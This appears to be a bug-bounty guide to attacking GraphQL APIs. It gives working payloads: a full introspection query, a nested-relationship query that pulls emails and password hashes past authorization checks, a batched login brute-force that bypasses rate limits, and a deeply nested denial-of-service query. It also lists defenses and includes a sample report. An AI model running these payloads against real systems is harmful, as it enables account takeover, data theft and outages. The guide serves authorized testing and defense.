# GraphQL Security & Introspection

## When to Use
- When intercepting web traffic that sends POST requests to `/graphql`, `/v1/graphql`, or `/api/graphql`.
- When requests contain `{"query": "query { ... }"}` or `{"variables": {...}}` JSON structures.
- To rapidly map the entire application data model (Introspection), or to test for IDOR/BOLA by exploiting deep relational nesting.


## Prerequisites
- Authorized scope and target URLs from bug bounty program
- Burp Suite Professional (or Community) configured with browser proxy
- Familiarity with OWASP Top 10 and common web vulnerability classes
- SecLists wordlists for fuzzing and enumeration

## Workflow

### Phase 1: Detecting GraphQL & Enabling Introspection

```graphql
# Concept: Unlike REST, GraphQL uses a single endpoint. If "Introspection" is enabled,
# the GraphQL server will literally explain its entire structure (all queries, mutations, 
# and object types) to anyone requesting it.

# 1. Standard Introspection Query (Send via POST /graphql)
{"query":"\n    query IntrospectionQuery {\n      __schema {\n        queryType { name }\n        mutationType { name }\n        subscriptionType { name }\n        types {\n          ...FullType\n        }\n        directives {\n          name\n          description\n          locations\n          args {\n            ...InputValue\n          }\n        }\n      }\n    }\n\n    fragment FullType on __Type {\n      kind\n      name\n      description\n      fields(includeDeprecated: true) {\n        name\n        description\n        args {\n          ...InputValue\n        }\n        type {\n          ...TypeRef\n        }\n        isDeprecated\n        deprecationReason\n      }\n      inputFields {\n        ...InputValue\n      }\n      interfaces {\n        ...TypeRef\n      }\n      enumValues(includeDeprecated: true) {\n        name\n        description\n        isDeprecated\n        deprecationReason\n      }\n      possibleTypes {\n        ...TypeRef\n      }\n    }\n\n    fragment InputValue on __InputValue {\n      name\n      description\n      type { ...TypeRef }\n      defaultValue\n    }\n\n    fragment TypeRef on __Type {\n      kind\n      name\n      ofType {\n        kind\n        name\n        ofType {\n          kind\n          name\n          ofType {\n            kind\n            name\n            ofType {\n              kind\n              name\n              ofType {\n                kind\n                name\n                ofType {\n                  kind\n                  name\n                  ofType {\n                    kind\n                    name\n                  }\n                }\n              }\n            }\n          }\n        }\n      }\n    }\n  "}

# 2. Result Analysis:
# If successful, you will receive a massive JSON dump containing the schema.
# Copy the JSON and load it into a tool like GraphQL Voyager (visual graph) or InQL (Burp Extension) to map the database visually.
```

### Phase 2: Exploiting Graph Relationships (IDOR)

```graphql
# Concept: A developer might secure the `user(id: 5)` query. But what if `company` 
# has a relationship field linking back to `users`? You can bypass the authorization 
# check by traversing the graph backwards.

# Assume we are NOT authorized to query other users:
query {
  user(id: 1) { email } # Returns Error: Denied
}

# Malicious nested traversal:
# We query a public company, then request its employees, reaching the user data anyway!
query {
  company(id: 99) {
    name
    employees {
      id
      email
      password_hash
    }
  }
}
# Result: Successful extraction of all email addresses and hashes!
```

### Phase 3: Query Batching (Rate Limit Bypass / Brute Force)

```json
# Concept: GraphQL supports "query batching" allowing clients to send arrays of multiple 
# queries in one single HTTP request. This completely defeats traditional IP-based WAF 
# HTTP rate limits.

# Standard Rate Limiting sees ONE incoming HTTP request. But inside that request...
[
  {"query": "mutation { login(user: \"admin\", pass: \"12345\") { token } }"},
  {"query": "mutation { login(user: \"admin\", pass: \"password\") { token } }"},
  {"query": "mutation { login(user: \"admin\", pass: \"admin123\") { token } }"},
  {"query": "mutation { login(user: \"admin\", pass: \"admin1234\") { token } }"}
  // ... Paste 50,000 queries here in one JSON array
]

# We executed 50,000 login attempts in a single network packet.
```

### Phase 4: Denial of Service (Deep Nested Queries)

```graphql
# Concept: Because GraphQL handles relationships dynamically, an attacker can request
# infinitely recursive relationships, crashing the backend server's CPU/Memory.

query {
  author(id: 1) {
    books {
      author {
        books {
          author {
            books {
              author {
                name    # Repeat 100 times until the backend runs out of memory (OOM crash)
              }
            }
          }
        }
      }
    }
  }
}
```

## 🔵 Blue Team Detection & Defense
- **Disable Introspection**: Production environments must strictly disable Introspection globally. It is designed for development and debugging, not public consumption.
- **Implement Depth Limitations**: Prevent recursive Denial of Service attacks by enforcing query depth limits (e.g., maximum depth of 5 nested relationships) in the GraphQL engine (Apollo/Relay).
- **Disable Batching**: Unless specifically required by the frontend client for performance, disable array-based query batching to prevent unmitigated brute-forcing and WAF evasion.
- **Resolver-Level Authorization**: Do not authorize data access at the top-level query path. Authorization must be performed at the node/resolver level so accessing `user` via `company.employees` checks the exact same permissions as querying `user(id: 5)` directly.

## Key Concepts
| Concept | Description |
|---------|-------------|
| GraphQL | A query-language API architecture alternative to REST allowing clients to request exactly the data payload they need, no more, no less |
| Introspection | A built-in system allowing a GraphQL client to query the GraphQL server for information about the underlying schema and types |
| Query Batching | Sending an array of multiple distinct GraphQL operations in a single HTTP POST request |
| Resolver | A function in the backend code responsible for fetching the data for a specific field within the GraphQL schema |

## Output Format
```
Bug Bounty Report: WAF Rate Limit Bypass via GraphQL Batching
=============================================================
Vulnerability: Application-Level Denial of Service & Authentication Bypass
Severity: High (CVSS 7.5)
Target: POST /graphql

Description:
The authentication endpoint utilizes GraphQL mutations (`loginMutation`) to process user logins. While the Cloudflare edge WAF limits HTTP requests to 10 per minute, the backend GraphQL server (Apollo) permits Query Batching. An attacker can construct a single HTTP request containing an array of 5,000 distinct login mutations, executing a massive brute-force attack entirely circumventing the HTTP rate limiter.

Reproduction Steps:
1. Intercept a standard login request.
2. Modify the JSON payload from a single object `{ "query": "mutation { login..." }` into a JSON array:
   `[ {"query": "mutation... pass='1'"}, {"query": "mutation... pass='2'"} ]`
3. Forward the request.
4. The server responds with an array of authentication failures and, sequentially, the successful authorization token.

Impact:
Immediate circumvention of brute-force protections allowing rapid credential stuffing resulting in Account Takeover (ATO).
